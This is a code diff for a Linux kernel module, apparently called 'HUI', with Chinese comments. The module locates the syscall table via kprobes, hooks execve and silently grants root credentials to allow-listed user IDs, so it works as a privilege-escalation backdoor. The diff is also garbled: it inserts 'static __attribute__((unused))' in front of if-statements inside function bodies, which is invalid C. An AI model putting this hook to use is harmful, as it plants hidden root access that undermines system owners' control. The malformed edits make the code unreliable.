@@ -8,7 +8,7 @@
 #include <asm/ptrace.h>
 
 // 内部函数：Kprobe 寻址 sys_call_table
-static unsigned long *hui_get_sys_call_table(void) {
+unsigned long *hui_get_sys_call_table(void) {
     unsigned long *table = NULL;
     struct kprobe kp = {
         .symbol_name = "kallsyms_lookup_name"
@@ -23,8 +23,8 @@ static unsigned long *hui_get_sys_call_table(void) {
     }
     kln = (kln_t) kp.addr;
     unregister_kprobe(&kp);
-
-    if (kln) {
+static __attribute__((unused)) 
+ if(kln) {
         table = (unsigned long *)kln("sys_call_table");
     }
     return table;
@@ -36,18 +36,18 @@ static unsigned long *hui_get_sys_call_table(void) {
  
 
 // 核心提权逻辑
-void hui_elevate_root(void) {
+static __attribute__((unused)) void hui_elevate_root(void) {
     struct cred *new_cred;
     if (!current->mm) return; // 排除内核线程
     new_cred = prepare_kernel_cred(NULL);
-    if (new_cred) {
+static __attribute__((unused))   if(new_cred) {
         commit_creds(new_cred);
         pr_info("HUI: [%s] 提权成功！\n", current->comm);
     }
 }
 
 // 伪造的 execve 系统调用
-asmlinkage long hui_hooked_execve_compat(const struct pt_regs *regs) {
+static __attribute__((unused)) asmlinkage long hui_hooked_execve_compat(const struct pt_regs *regs) {
     uid_t uid = current_uid().val;
     if (uid != 0 && hui_is_uid_allowed(uid)) {
         hui_elevate_root();
@@ -56,7 +56,7 @@ asmlinkage long hui_hooked_execve_compat(const struct pt_regs *regs) {
 }
 
 // 初始化 Hook
-int hui_hook_init(void) {
+static __attribute__((unused)) int hui_hook_init(void) {
     hui_state.sys_call_table = hui_get_sys_call_table();
     if (!hui_state.sys_call_table) return -EFAULT;
 
@@ -75,8 +75,8 @@ int hui_hook_init(void) {
 }
 
 // 退出 Hook
-void hui_hook_exit(void) {
-    if (hui_state.sys_call_table && hui_state.original_execve) {
+static __attribute__((unused)) void hui_hook_exit(void) {
+static __attribute__((unused))   if(hui_state.sys_call_table && hui_state.original_execve) {
         hui_disable_wp();
         hui_state.sys_call_table[__NR_execve] = (unsigned long)hui_state.original_execve;
         hui_enable_wp();
